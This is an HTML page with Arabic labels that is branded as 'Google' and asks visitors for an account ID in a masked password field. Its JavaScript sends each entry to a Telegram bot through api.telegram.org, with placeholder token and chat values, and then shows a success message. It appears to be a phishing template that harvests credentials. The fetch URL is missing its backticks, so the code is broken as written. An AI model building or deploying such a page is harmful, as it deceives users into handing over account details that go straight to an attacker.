<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>My Page</title>

<style>
body {
    margin: 0;
    padding: 0;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;
    background: linear-gradient(135deg, #0f0f1a, #1c1c3c);
    font-family: Arial, sans-serif;
}

/* دائرة الصورة */
.circle {
    width: 170px;
    height: 170px;
    border-radius: 50%;
    overflow: hidden;
    border: 4px solid #ffffff22;
    box-shadow: 0 0 25px rgba(255, 0, 150, 0.5);
    margin-bottom: 20px;
}

.circle img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* اسم متوهج */
.glow-text {
    font-size: 55px;
    font-weight: bold;
    background: linear-gradient(90deg, red, purple);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: glow 2s infinite alternate;
    margin-bottom: 30px;
}

@keyframes glow {
    from { text-shadow: 0 0 10px red, 0 0 20px red; }
    to { text-shadow: 0 0 20px purple, 0 0 40px purple; }
}

/* صندوق الإدخال */
.container {
    background: #ffffff10;
    padding: 25px;
    border-radius: 15px;
    backdrop-filter: blur(10px);
    text-align: center;
    box-shadow: 0 0 20px rgba(0,0,0,0.5);
}

input {
    width: 250px;
    padding: 12px;
    font-size: 18px;
    border-radius: 10px;
    border: none;
    outline: none;
    text-align: center;
    letter-spacing: 5px;
}

button {
    margin-top: 15px;
    padding: 10px 25px;
    border: none;
    border-radius: 10px;
    background: linear-gradient(90deg, red, purple);
    color: white;
    font-size: 16px;
    cursor: pointer;
    transition: 0.3s;
}

button:hover {
    transform: scale(1.05);
}
</style>
</head>

<body>

<!-- صورة -->
<div class="circle">
    <img src="ggg.png" alt="Profile">
</div>

<!-- اسم -->
<div class="glow-text">Google</div>

<!-- إدخال آيدي -->
<div class="container">
    <h3 style="color:white;">ادخل آيدي الحساب</h3>
    <input type="password" id="userId" placeholder="اكتب الآيدي هنا">
    <br>
    <button onclick="sendToTelegram()">إرسال</button>
</div>

<script>
function sendToTelegram() {

    const userId = document.getElementById("userId").value;

    if(userId === ""){
        alert("الرجاء إدخال الآيدي");
        return;
    }

    const botToken = "PUT_YOUR_BOT_TOKEN_HERE";
    const chatId = "PUT_YOUR_CHAT_ID_HERE";

    const message = "تم إدخال آيدي جديد: " + userId;

    fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    })
    .then(response => response.json())
    .then(data => alert("تم الإرسال بنجاح ✅"))
    .catch(error => alert("حدث خطأ ❌"));
}
</script>

</body>
</html>
